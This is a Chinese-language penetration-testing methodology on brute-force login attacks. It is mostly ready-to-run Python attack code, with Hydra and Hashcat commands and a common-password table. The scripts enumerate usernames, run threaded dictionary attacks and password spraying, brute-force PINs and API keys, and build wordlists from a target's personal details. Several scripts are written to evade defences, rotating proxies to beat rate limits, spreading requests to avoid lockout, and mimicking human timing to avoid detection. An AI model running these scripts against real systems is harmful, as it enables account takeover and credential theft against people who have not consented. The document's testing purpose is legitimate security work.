# 暴力破解攻击方法论

## 1. 技术概述

### 1.1 漏洞原理
暴力破解攻击发生在以下场景：
- **无速率限制**：登录端点不限制单位时间内的请求次数
- **无 CAPTCHA**：无人机验证机制区分人类和自动化脚本
- **无账户锁定**：账户在多次失败尝试后不会被锁定
- **弱密码策略**：允许使用简单、常见的密码

**本质**：攻击者通过系统性尝试大量密码组合，最终猜出正确凭证。

### 1.2 攻击影响
- **账户接管**：成功破解用户密码获得账户访问权
- **权限提升**：破解管理员账户获得高权限
- **数据泄露**：访问账户中的敏感信息
- **横向移动**：使用破解凭证访问其他系统

### 1.3 攻击类型

| 类型 | 描述 | 适用场景 |
|-----|------|---------|
| **纯暴力破解** | 尝试所有可能字符组合 | 短密码、已知密码长度 |
| **字典攻击** | 使用常见密码列表 | 大多数场景 |
| **密码喷洒** | 对所有账户使用少量常见密码 | 避免触发账户锁定 |
| **针对性字典** | 基于目标信息生成密码 | 已知目标个人信息 |
| **规则攻击** | 基于已知密码模式变换 | 已知部分密码特征 |

---

## 2. 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **登录接口** | POST /login, POST /token | 无速率限制，可无限次尝试 |
| **API 认证** | API 密钥/Token 验证 | 无请求频率限制 |
| **密码重置** | 安全问题验证 | 答案可暴力猜测 |
| **PIN 码验证** | 4-6 位数字 PIN | 组合空间小（10000-1000000） |
| **备份码验证** | 2FA 备份码 | 无尝试限制 |
| **管理员登录** | 后台管理系统 | 通常防护较弱 |
| **旧系统** | 遗留系统 | 缺乏现代安全控制 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 速率限制检测
```python
import requests
import time

def test_rate_limiting(login_url, username, num_attempts=20):
    """测试登录端点的速率限制"""
    
    results = []
    
    for i in range(num_attempts):
        start_time = time.time()
        
        response = requests.post(login_url, data={
            "username": username,
            "password": f"wrongpassword{i}"
        })
        
        elapsed = time.time() - start_time
        
        results.append({
            'attempt': i + 1,
            'status_code': response.status_code,
            'response_time': elapsed,
            'headers': dict(response.headers)
        })
        
        # 检查速率限制响应
        if response.status_code == 429:
            print(f"⚠ Rate limiting triggered at attempt {i+1}")
            retry_after = response.headers.get('Retry-After')
            if retry_after:
                print(f"   Retry-After: {retry_after} seconds")
            break
        
        print(f"Attempt {i+1}: {response.status_code} ({elapsed:.2f}s)")
    
    return results

# 使用示例
results = test_rate_limiting("http://target/login", "admin")
```

#### 3.1.2 账户锁定检测
```python
def test_account_lockout(login_url, username, password_list):
    """测试账户锁定机制"""
    
    locked = False
    successful_after_failures = False
    
    for i, password in enumerate(password_list):
        response = requests.post(login_url, data={
            "username": username,
            "password": password
        })
        
        # 检查账户锁定消息
        if "locked" in response.text.lower() or "too many attempts" in response.text.lower():
            print(f"⚠ Account locked after {i+1} failed attempts")
            locked = True
            break
        
        print(f"Attempt {i+1}: Failed (account not locked)")
    
    # 尝试使用正确密码（如果知道）
    if locked:
        print("\n[*] Testing if account is actually locked...")
        correct_response = requests.post(login_url, data={
            "username": username,
            "password": "correct_password_if_known"
        })
        
        if is_login_success(correct_response):
            successful_after_failures = True
            print("⚠ Account NOT actually locked - can still login!")
    
    return locked, successful_after_failures
```

#### 3.1.3 CAPTCHA 检测
```python
def test_captcha_presence(login_url):
    """检测登录表单是否有 CAPTCHA"""
    
    response = requests.get(login_url)
    
    # 检查常见 CAPTCHA 元素
    captcha_indicators = [
        'captcha',
        'recaptcha',
        'hcaptcha',
        'verify',
        'security_code',
        'validation',
        'challenge'
    ]
    
    found_indicators = []
    for indicator in captcha_indicators:
        if indicator in response.text.lower():
            found_indicators.append(indicator)
    
    # 检查 CAPTCHA 相关脚本
    if "recaptcha" in response.text:
        found_indicators.append("Google reCAPTCHA")
    if "hcaptcha" in response.text:
        found_indicators.append("hCaptcha")
    
    if found_indicators:
        print(f"⚠ CAPTCHA detected: {found_indicators}")
        return True
    else:
        print("✓ No CAPTCHA detected - vulnerable to automation")
        return False
```

#### 3.1.4 自动化暴力破解
```python
def brute_force_attack(login_url, username, password_file, delay=0.1):
    """执行暴力破解攻击"""
    
    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f]
    
    print(f"[*] Starting brute force attack on {username}")
    print(f"[*] Password list: {len(passwords)} passwords")
    
    for i, password in enumerate(passwords):
        try:
            response = requests.post(login_url, data={
                "username": username,
                "password": password
            })
            
            if is_login_success(response):
                print(f"\n✓ SUCCESS! Password found: {password}")
                print(f"   Attempts: {i+1}")
                return password
            
            # 进度显示
            if (i + 1) % 100 == 0:
                print(f"[*] Tested {i+1}/{len(passwords)} passwords...")
            
            # 延迟避免触发速率限制
            time.sleep(delay)
            
        except Exception as e:
            print(f"Error: {e}")
            continue
    
    print("\n✗ Password not found in list")
    return None
```

### 3.2 白盒测试

#### 3.2.1 源代码审计
```bash
# 检查速率限制实现
grep -rn "rate.*limit\|throttle\|ratelimit" --include="*.py" --include="*.js"

# 检查账户锁定逻辑
grep -rn "lock.*account\|failed.*attempt\|max.*attempt" --include="*.py"

# 检查 CAPTCHA 集成
grep -rn "captcha\|recaptcha" --include="*.py" --include="*.js"

# 检查登录验证逻辑
grep -rn "authenticate\|login\|verify.*password" --include="*.py"
```

#### 3.2.2 配置检查
```bash
# 检查速率限制配置
grep -rn "RATE_LIMIT\|THROTTLE" config/ settings.py .env

# 检查账户锁定配置
grep -rn "ACCOUNT_LOCK\|MAX_ATTEMPTS\|LOCKOUT" config/ settings.py

# 检查安全配置
grep -rn "SECURITY\|CAPTCHA" config/ settings.py
```

---

## 4. 漏洞利用方法

### 4.1 基础信息收集

#### 4.1.1 识别有效用户名
```python
def enumerate_usernames(login_url, username_list):
    """枚举有效用户名"""
    
    valid_usernames = []
    
    for username in username_list:
        response = requests.post(login_url, data={
            "username": username,
            "password": "definitely_wrong_password"
        })
        
        # 检测用户名是否存在（基于错误消息差异）
        if "user not found" in response.text.lower():
            print(f"✗ User {username} does not exist")
        elif "incorrect password" in response.text.lower():
            print(f"✓ User {username} exists")
            valid_usernames.append(username)
        else:
            # 模糊判断
            print(f"? User {username} - unclear")
    
    return valid_usernames
```

#### 4.1.2 密码策略分析
```python
def analyze_password_policy(registration_url):
    """分析密码策略要求"""
    
    response = requests.get(registration_url)
    
    policy_indicators = {
        'min_length': None,
        'require_uppercase': False,
        'require_lowercase': False,
        'require_number': False,
        'require_special': False,
        'max_length': None
    }
    
    # 从 HTML 提取策略要求
    import re
    
    # 最小长度
    min_len_match = re.search(r'minimum.*?(\d+).*?character', response.text, re.I)
    if min_len_match:
        policy_indicators['min_length'] = int(min_len_match.group(1))
    
    # 复杂度要求
    if 'uppercase' in response.text.lower():
        policy_indicators['require_uppercase'] = True
    if 'lowercase' in response.text.lower():
        policy_indicators['require_lowercase'] = True
    if 'number' in response.text.lower() or 'digit' in response.text.lower():
        policy_indicators['require_number'] = True
    if 'special' in response.text.lower() or 'symbol' in response.text.lower():
        policy_indicators['require_special'] = True
    
    return policy_indicators
```

### 4.2 暴力破解攻击

#### 4.2.1 字典攻击
```python
def dictionary_attack(login_url, username, wordlist_file, threads=5):
    """多线程字典攻击"""
    
    import threading
    from queue import Queue
    
    password_queue = Queue()
    result = {'found': False, 'password': None}
    lock = threading.Lock()
    
    # 加载密码列表
    with open(wordlist_file, 'r') as f:
        passwords = [line.strip() for line in f]
    
    # 填充队列
    for password in passwords:
        password_queue.put(password)
    
    def worker():
        while not result['found']:
            try:
                password = password_queue.get(timeout=1)
            except:
                return
            
            try:
                response = requests.post(login_url, data={
                    "username": username,
                    "password": password
                }, timeout=10)
                
                if is_login_success(response):
                    with lock:
                        if not result['found']:
                            result['found'] = True
                            result['password'] = password
                            print(f"\n✓ Password found: {password}")
                
                password_queue.task_done()
                
            except Exception as e:
                continue
    
    # 创建工作线程
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    # 等待完成
    password_queue.join()
    
    return result['password']
```

#### 4.2.2 密码喷洒攻击
```python
def password_spraying(login_url, usernames, common_passwords, delay=60):
    """
    密码喷洒攻击：对所有用户使用相同密码，避免触发账户锁定
    """
    
    compromised_accounts = []
    
    for password in common_passwords:
        print(f"\n[*] Spraying password: {password}")
        
        for username in usernames:
            try:
                response = requests.post(login_url, data={
                    "username": username,
                    "password": password
                }, timeout=5)
                
                if is_login_success(response):
                    print(f"✓ {username}:{password}")
                    compromised_accounts.append((username, password))
                
                # 请求间小延迟
                time.sleep(0.5)
                
            except Exception as e:
                continue
        
        # 每轮密码测试间大延迟
        print(f"[*] Waiting {delay} seconds before next password...")
        time.sleep(delay)
    
    return compromised_accounts
```

#### 4.2.3 针对性字典生成
```python
def generate_targeted_wordlist(target_info):
    """
    基于目标信息生成针对性密码字典
    """
    
    passwords = []
    
    # 基本信息
    name = target_info.get('name', '')
    birth_year = target_info.get('birth_year', '')
    pet_name = target_info.get('pet_name', '')
    favorite_number = target_info.get('favorite_number', '')
    
    # 常见模式
    patterns = [
        "{name}{year}",
        "{name}{number}",
        "{name}!",
        "{name}123",
        "{year}{name}",
        "{pet}{year}",
        "Password{year}",
        "Welcome{year}",
    ]
    
    # 生成密码
    for pattern in patterns:
        password = pattern.format(
            name=name.capitalize() if name else '',
            year=birth_year or '',
            number=favorite_number or '',
            pet=pet_name.capitalize() if pet_name else ''
        )
        if password:
            passwords.append(password)
    
    # 添加常见变体
    base_passwords = [name, pet_name, 'password', 'welcome']
    for base in base_passwords:
        if base:
            passwords.extend([
                base,
                base.upper(),
                base.capitalize(),
                base + '1',
                base + '123',
                base + '!',
                base + birth_year if birth_year else ''
            ])
    
    return list(set(passwords))  # 去重
```

### 4.3 实际利用场景

#### 4.3.1 PIN 码暴力破解
```python
def brute_force_pin(login_url, username, pin_length=4):
    """暴力破解 4-6 位 PIN 码"""
    
    import itertools
    
    print(f"[*] Starting PIN brute force (length: {pin_length})")
    
    # 生成所有可能的 PIN 组合
    for pin in itertools.product('0123456789', repeat=pin_length):
        pin_str = ''.join(pin)
        
        response = requests.post(login_url, data={
            "username": username,
            "pin": pin_str
        })
        
        if is_login_success(response):
            print(f"\n✓ PIN found: {pin_str}")
            return pin_str
    
    print("✗ PIN not found")
    return None
```

#### 4.3.2 API 密钥暴力破解
```python
def brute_force_api_key(api_endpoint, key_pattern, key_length=32):
    """
    暴力破解 API 密钥
    key_pattern: 密钥模式，如 'Bearer {}' 或 'X-API-Key: {}'
    """
    
    import random
    import string
    
    # 常见 API 密钥字符集
    charset = string.ascii_letters + string.digits + '-_'
    
    print(f"[*] Starting API key brute force (length: {key_length})")
    
    # 随机测试（完整暴力破解不现实）
    for _ in range(100000):
        key = ''.join(random.choice(charset) for _ in range(key_length))
        
        response = requests.get(api_endpoint, headers={
            'Authorization': key_pattern.format(key)
        })
        
        if response.status_code == 200:
            print(f"\n✓ API Key found: {key}")
            return key
    
    print("✗ API key not found in 100000 attempts")
    return None
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过速率限制

#### 5.1.1 IP 轮换
```python
class RotatingProxyBruteforce:
    """使用代理 IP 轮换绕过速率限制"""
    
    def __init__(self, login_url, proxy_list):
        self.login_url = login_url
        self.proxy_list = proxy_list
        self.current_proxy_index = 0
    
    def get_next_proxy(self):
        proxy = self.proxy_list[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
        return {'http': proxy, 'https': proxy}
    
    def brute_force(self, username, password_list):
        for password in password_list:
            proxy = self.get_next_proxy()
            
            try:
                response = requests.post(self.login_url, data={
                    "username": username,
                    "password": password
                }, proxies=proxy, timeout=10)
                
                if is_login_success(response):
                    print(f"✓ Password found: {password} (via {proxy})")
                    return password
                
            except Exception as e:
                print(f"Error via {proxy}: {e}")
                continue
        
        return None
```

#### 5.1.2 请求延迟优化
```python
def adaptive_delay_attack(login_url, username, password_list):
    """
    自适应延迟攻击：根据响应动态调整延迟
    """
    
    base_delay = 0.5
    current_delay = base_delay
    
    for i, password in enumerate(password_list):
        start_time = time.time()
        
        response = requests.post(login_url, data={
            "username": username,
            "password": password
        })
        
        elapsed = time.time() - start_time
        
        # 检测速率限制迹象
        if response.status_code == 429:
            print(f"⚠ Rate limited, increasing delay to {current_delay * 2}s")
            current_delay *= 2
            time.sleep(current_delay)
            continue
        
        # 检测响应变慢（可能被限流）
        if elapsed > 5:
            print(f"⚠ Slow response ({elapsed:.2f}s), increasing delay")
            current_delay *= 1.5
        
        if is_login_success(response):
            print(f"✓ Password found: {password}")
            return password
        
        # 应用延迟
        time.sleep(current_delay)
    
    return None
```

### 5.2 绕过账户锁定

#### 5.2.1 分布式密码喷洒
```python
def distributed_password_spray(targets, common_passwords, time_window=300):
    """
    分布式密码喷洒：在时间窗口内分散请求，避免触发锁定
    """
    
    import random
    
    compromised = []
    
    for password in common_passwords:
        print(f"\n[*] Testing password: {password}")
        
        # 打乱目标顺序
        shuffled_targets = targets.copy()
        random.shuffle(shuffled_targets)
        
        # 计算每个请求的延迟
        delay = time_window / len(shuffled_targets)
        
        for target in shuffled_targets:
            try:
                response = requests.post(f"{target}/login", data={
                    "username": "admin",
                    "password": password
                }, timeout=5)
                
                if is_login_success(response):
                    print(f"✓ {target} compromised")
                    compromised.append((target, "admin", password))
                
            except Exception as e:
                continue
            
            # 在时间窗口内均匀分布请求
            time.sleep(delay)
        
        # 每轮之间额外延迟
        time.sleep(60)
    
    return compromised
```

### 5.3 绕过检测

#### 5.3.1 人类行为模拟
```python
def human_like_bruteforce(login_url, username, password_list):
    """
    模拟人类行为的暴力破解：随机延迟、鼠标移动模拟等
    """
    
    import random
    
    for password in password_list:
        # 随机延迟（2-8 秒模拟人类输入）
        delay = random.uniform(2, 8)
        time.sleep(delay)
        
        # 模拟打字延迟
        typing_delay = random.uniform(0.5, 2)
        time.sleep(typing_delay)
        
        try:
            response = requests.post(login_url, data={
                "username": username,
                "password": password
            })
            
            if is_login_success(response):
                print(f"✓ Password found: {password}")
                return password
            
        except Exception as e:
            continue
    
    return None
```

---

## 6. 常用工具

### 6.1 Hydra
```bash
# HTTP POST 表单暴力破解
hydra -l admin -P /path/to/wordlist.txt http-post-form \
  "/login:username=^USER^&password=^PASS^:Incorrect" \
  -t 4 -V

# 多用户多密码
hydra -L users.txt -P passwords.txt http-post-form \
  "/login:user=^USER^&pass=^PASS^:Login failed" \
  -t 4

# 带 Cookie 的暴力破解
hydra -l admin -P wordlist.txt http-post-form \
  "/login:username=^USER^&password=^PASS^:Failed" \
  -H "Cookie: session=abc123"
```

### 6.2 Burp Suite Intruder
```
# Intruder 配置示例
Target: POST /login
Position: username=§admin§&password=§password§

Payload types:
- Simple list (字典攻击)
- Number range (数字范围)
- Brute force (暴力枚举)

Grep match 检测:
- "Welcome" (成功)
- "Invalid" (失败)
```

### 6.3 Hashcat (离线破解)
```bash
# 破解 bcrypt 哈希
hashcat -m 3200 hashes.txt wordlist.txt

# 破解 MD5
hashcat -m 0 hashes.txt wordlist.txt

# 规则攻击
hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule
```

---

## 7. 常用 Payload 速查表

### 7.1 Top 100 常见密码

| 密码 | 使用率 |
|-----|-------|
| 123456 | ~5% |
| password | ~4% |
| 12345678 | ~2% |
| qwerty | ~1.5% |
| abc123 | ~1.2% |
| monkey | ~1% |
| 1234567 | ~1% |
| letmein | ~0.8% |
| trustno1 | ~0.7% |
| dragon | ~0.6% |

### 7.2 针对性密码模式

| 模式 | 示例 |
|-----|------|
| 姓名 + 年份 | John1990, Mary2000 |
| 姓名 + 数字 | John123, Mary456 |
| 季节 + 年份 | Summer2023, Winter2024 |
| 单词 +! | Password!, Welcome! |
| 键盘模式 | qwerty, asdfgh, 123456 |

---

## 8. 参考资源

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Brute Force Attack Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)
- [Hashcat Password Cracking](https://hashcat.net/hashcat/)
- [THC Hydra Project](https://github.com/vanhauser-thc/thc-hydra)
